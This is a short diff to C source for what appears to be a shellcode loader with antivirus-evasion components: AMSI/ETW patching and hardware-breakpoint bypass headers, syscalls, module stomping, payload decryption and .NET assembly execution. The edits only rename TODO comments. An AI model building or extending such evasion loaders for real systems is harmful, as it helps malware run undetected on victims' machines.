@@ -3,7 +3,7 @@
 #include "auxiliary/syscalls.h"
 #include "evasion/patch_amsi_etw.h"
 // +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
-// TODO Punkt 7                                                                                              #
+// TODO 7                                                                                                    #
 // +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
 #include "evasion/hwbp_amsi_etw.h"
 #include "auxiliary/stomping.h"
@@ -52,7 +52,7 @@ Run()
     NTSTATUS ntStatus;
     HMODULE  hNtdll;
     SIZE_T   payloadLen             = SHELLCODE_LEN;
-//TODO Punkt 2
+//TODO 2
     //CHAR     payload[SHELLCODE_LEN] = SHELLCODE;
 #ifdef SHELLCODE_FILE
 
@@ -181,7 +181,7 @@ Run()
     //               Maybe add a flag such as --shellcode-file and add the appropriate #ifdefs                   //
     // +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ //
 
-    // TODO Punkt 2
+    // TODO 2
     // CHAR decryptedPayload[SHELLCODE_LEN] = { 0 };
     CHAR* decryptedPayload = (CHAR*)malloc(payloadLen);
     
@@ -341,7 +341,7 @@ Run()
 #endif
 
 #ifdef RUN_DOTNET
-    // TODO Punkt 2
+    // TODO 2
     // RunDotnetAssembly(pAllocMem, SHELLCODE_LEN);
     RunDotnetAssembly(pAllocMem, payloadLen);
 #endif
